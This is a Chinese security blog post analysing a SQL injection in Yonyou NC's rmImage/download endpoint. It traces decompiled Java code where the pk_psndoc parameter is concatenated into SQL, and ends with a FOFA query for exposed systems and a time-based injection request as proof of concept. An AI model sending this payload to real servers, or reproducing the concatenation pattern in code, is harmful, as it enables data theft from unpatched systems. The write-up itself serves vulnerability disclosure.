---
title: "用友NC rmImage/download sql注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-rmImage-download-pk_psndoc-sqli.html
asset_dir: assets/用友nc-rmimagedownload-sql注入漏洞
---

# 用友NC rmImage/download sql注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/12 18:40
- 1020浏览
- [0评论](#comment)
- 2小时阅读

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")NC系统可利用/portal/pt/rmImage/download接口中的 pk\_psndoc 参数实现sql注入，从而窃取服务器的敏感信息。

编程

# 影响版本

NC65

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

本来是根据官方[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")通告可知SQL注入点在 rmImage 接口

[![用友NC rmImage/download sql注入漏洞](images/img-001-6419315c6a19.webp)](https://image.mrxn.net/b0302f3340dd44d998aa036130d7565c.webp)

因此搜索 rmImage 方法的实现部分即可定位文件

代码安全审计

nc/bs/hrss/pub/action/RMImageAction.class

```
package nc.bs.hrss.pub.action;

import com.sun.image.codec.jpeg.JPEGCodec;
import com.sun.image.codec.jpeg.JPEGImageEncoder;
import java.awt.Image;
import java.awt.image.BufferedImage;
import java.awt.image.ImageObserver;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.OutputStream;
import javax.swing.ImageIcon;
import nc.bs.framework.common.RuntimeEnv;
import nc.bs.hrss.pub.ServiceLocator;
import nc.bs.hrss.pub.exception.HrssException;
import nc.bs.hrss.pub.tool.SessionUtil;
import nc.bs.logging.Logger;
import nc.itf.hi.IPsndocQryService;
import nc.itf.rm.IRMPsndocQueryService;
import nc.uap.lfw.core.LfwRuntimeEnvironment;
import nc.uap.lfw.core.exception.LfwRuntimeException;
import nc.uap.lfw.servletplus.annotation.Action;
import nc.uap.lfw.servletplus.annotation.Servlet;
import nc.uap.lfw.servletplus.core.impl.BaseAction;
import nc.vo.bd.pub.SexEnum;
import nc.vo.hi.psndoc.PsndocAggVO;
import nc.vo.hr.tools.formconfig.CodeGenUtils;
import nc.vo.pub.AggregatedValueObject;
import nc.vo.pub.BusinessException;
import nc.vo.rm.psndoc.AggRMPsndocVO;
import nc.vo.rm.psndoc.RMPsndocVO;
import org.apache.commons.io.IOUtils;
import uap.lfw.core.ml.LfwResBundle;

@Servlet(
    path = "/rmImage"
)
public class RMImageAction extends BaseAction {
    public RMImageAction() {
    }

    @Action
    public void download() {
        OutputStream out = null;

        try {
            byte[] pngBytes = null;
            byte[] pngBytesNew = null;
            Object photo = null;
            AggRMPsndocVO aggRMPsndocVO = null;
            FileInputStream fileInput = null;
            this.request.setCharacterEncoding("UTF-8");
            String pk_psndoc = this.request.getParameter("pk_psndoc");

            try {
                photo = SessionUtil.getAttribute("photo");
                AggregatedValueObject aggVO = this.queryAggRMPsndocVO(pk_psndoc);
                if (aggVO != null && aggVO instanceof AggRMPsndocVO) {
                    aggRMPsndocVO = (AggRMPsndocVO)aggVO;
                }

                if (photo == null) {
                    photo = aggRMPsndocVO == null ? null : ((RMPsndocVO)aggRMPsndocVO.getParentVO()).getPhoto();
                }

                if (photo != null) {
                    pngBytes = (byte[])photo;
                } else {
                    String photoFileName = "photo_defult_male.png";
                    if (SessionUtil.getSessionBean() != null || aggRMPsndocVO != null) {
                        if (null != aggRMPsndocVO && null != aggRMPsndocVO.getParentVO() && null != aggRMPsndocVO.getPsndocVO().getSex() && SexEnum.SEX_FEMAIL.toIntValue() == aggRMPsndocVO.getPsndocVO().getSex()) {
                            photoFileName = "photo_defult_female.png";
                        }

                        if (aggRMPsndocVO == null) {
                            IPsndocQryService psndocQry = (IPsndocQryService)ServiceLocator.lookup(IPsndocQryService.class);
                            PsndocAggVO psndocAggVO = psndocQry.queryPsndocVOByPk(SessionUtil.getPk_psndoc(), false, true);
                            if (null != psndocAggVO && null != psndocAggVO.getParentVO() && null != psndocAggVO.getParentVO().getSex() && SexEnum.SEX_FEMAIL.toIntValue() == psndocAggVO.getParentVO().getSex()) {
                                photoFileName = "photo_defult_female.png";
                            }
                        }
                    }

                    String strSrcDir = CodeGenUtils.buildFileURL(RuntimeEnv.getInstance().getNCHome(), new String[]{"hotwebs", "lfw", "frame", "device_pc", "themes", LfwRuntimeEnvironment.getThemeId(), "ext", "hrss", "pub", photoFileName});
                    File file = new File(strSrcDir);
                    fileInput = new FileInputStream(file);
                    pngBytes = new byte[fileInput.available()];
                    fileInput.read(pngBytes);
                }

                pngBytesNew = transPreviewPhoto(pngBytes, 150, 118);
                this.response.setContentType("image/png");
                out = this.response.getOutputStream();
                out.write(pngBytesNew);
                out.flush();
            } catch (HrssException ex) {
                Logger.error(ex.getMessage(), ex);
            } catch (BusinessException e) {
                (new HrssException(e)).alert();
            } finally {
                if (fileInput != null) {
                    fileInput.close();
                }

            }
        } catch (Exception e) {
            throw new LfwRuntimeException(LfwResBundle.getInstance().getStrByID("c_pub-res", "0c_pub-res0051"), e);
        } finally {
            IOUtils.closeQuietly(out);
        }

    }
```

pk\_psndoc 参数直接代入 queryAggRMPsndocVO 函数，其实现逻辑如下

漏洞扫描服务

```
private AggregatedValueObject queryAggRMPsndocVO(String pk_psndoc) {
    try {
        IRMPsndocQueryService psndocQryServ = (IRMPsndocQueryService)ServiceLocator.lookup(IRMPsndocQueryService.class);
        AggRMPsndocVO aggRMPsndocVO = psndocQryServ.queryByPK(pk_psndoc);
        return aggRMPsndocVO;
    } catch (BusinessException e) {
        (new HrssException(e)).deal();
    } catch (HrssException e) {
        (new HrssException(e)).alert();
    }

    return null;
}
```

继续代入 psndocQryServ.queryByPK 函数，其实现逻辑如下

```
public AggRMPsndocVO queryByPK(String pk_psndoc) throws BusinessException {
    return (AggRMPsndocVO)this.getServiceTemplate().queryByPk(AggRMPsndocVO.class, pk_psndoc);
}
```

继续跟踪 getServiceTemplate().queryByPk 函数，这里注意 传入的第三个参数为 false

计算机服务器

```
public <T> T queryByPk(Class<T> clazz, String pk) throws BusinessException {
    return (T)this.queryByPk(clazz, pk, false);
}
public <T> T queryByPk(Class<T> clazz, String pk, boolean lazyLoad2) throws BusinessException {
    try {
        return (T)getMDQueryService().queryBillOfVOByPK(clazz, pk, lazyLoad2);
    } catch (MetaDataException e) {
        Logger.error(e.getMessage(), e);
        throw new BusinessException(ResHelper.getString("6001frame", "06001frame0153"), e);
    }
}
```

继续跟踪 getMDQueryService().queryBillOfVOByPK 函数

```
public <T> T queryBillOfVOByPK(Class<T> voClass, String billPK, boolean bLazyLoad) throws MetaDataException {
    return (T)(new MDBaseDAO()).queryBillOfVOByPK(voClass, billPK, bLazyLoad);
}
```

pk\_psndoc ==>pk ==>billPK 又代入 (new MDBaseDAO()).queryBillOfVOByPK 函数

SQL注入防护

```
public Object queryBillOfVOByPK(Class voClass, String billPK, boolean bLazyLoad) throws MetaDataException {
    NCObject ncObj = (new VOQueryPersister(voClass.getName())).queryBillImp(billPK, bLazyLoad);
    if (ncObj == null) {
        return null;
    } else {
        return AggregatedValueObject.class.isAssignableFrom(voClass) ? ncObj.getContainmentObject() : ncObj.getModelConsistObject();
    }
}
```

billPK 继续代入 queryBillImp 函数

```
protected NCObject queryBillImp(String billPK, boolean bLazyLoad) throws MetaDataException {
    NCObject resNCObj = null;

    try {
        Object resVO = this.dao.retrieveByPK(billPK, this.ignoreDrEqual1);
        if (resVO == null) {
            return null;
        } else {
            resNCObj = NCObject.newInstance(this.relatedEntity, resVO);
            if (!bLazyLoad) {
                this.queryChildrenVOSByParentObjs(new NCObject[]{resNCObj}, bLazyLoad, (Map)null, (String)null);
            }

            return resNCObj;
        }
    } catch (Exception e) {
        Logger.error("fail to query data", e);
        throw new MetaDataException("operation failed** baseDao.retrieveByPK," + e.getMessage());
    }
}
```

继续跟踪 retrieveByPK 函数

搜索引擎

```
public Object retrieveByPK(String pkValue, boolean ignoreDrEqual1) throws MetaDataException {
    if (this.metaCollection != null && this.metaCollection.size() != 0) {
        String whereConStr = "";
        whereConStr = (String)this.tableAliasMap.get(this.bean.getTable().getName()) + "." + this.bean.getTable().getPrimaryKeyName() + "='" + pkValue + "'";
        if (ignoreDrEqual1) {
            whereConStr = whereConStr + " and isnull(" + this.bean.getTable().getName() + ".dr,0)=0 ";
        }

        List<E> beanList = this.retrieveByClouse(whereConStr, (String[])null, false);
        return beanList != null && beanList.size() > 0 ? beanList.get(0) : null;
    } else {
        return null;
    }
}

public List<E> retrieveByClouse(String whereCondStr, String[] filtAttrNames, boolean ignoreDrEqual1) throws MetaDataException {
    String resultSql = this.generateSql(whereCondStr, filtAttrNames, (String)null, (String)null, ignoreDrEqual1);
    List<E> beanList = null;

    try {
        beanList = (List)(new BaseDAO()).executeQuery(resultSql, new BeanListFromColumnLableProcessor(Class.forName(this.bean.getFullClassName()), this.bean));
        return beanList;
    } catch (Exception e) {
        throw new MetaDataException(NCLangResOnserver.getInstance().getStrByID("mdbusi", "mdMultiTableDAO-0001") + resultSql + "####type:" + this.bean.getName() + "#$#$#" + e.getMessage(), e);
    }
}
```

至此，最终 pk\_psndoc 参数拼接进SQL语句里，ignoreDrEqual1 在前面已经定义传入的为 false ，而 generateSql 函数的作用是组装SQL语句

编程

[![用友NC rmImage/download sql注入漏洞](images/img-002-e9e9638bcfbc.webp)](https://image.mrxn.net/b3e397c997d748928687a42f4caf1ac0.webp)

最终调用 (new BaseDAO()).executeQuery 执行上面组合后的SQL语句，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞。

# 漏洞复现

可先通过如下请求来确定目标是否存在此接口及其响应，如果存在此模块，则会响应一个图片内容

```
GET /portal/pt/rmImage/download?pageId=login&pk_psndoc=1 HTTP/1.1
Host: nc65.mrxn.net
```

漏洞利用示例

漏洞扫描服务

```
GET /portal/pt/rmImage/download?pageId=login&pk_psndoc=1'+and+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',6)-- HTTP/1.1
HTTP/1.1
Host: nc65.mrxn.net

HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=xxxxx.ncServer; Path=/portal/; HttpOnly
Content-Type: image/jpeg

xxxxJFIFxxC
```

# 参考

- `https://security.yonyou.com/#/noticeInfo?id=670`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
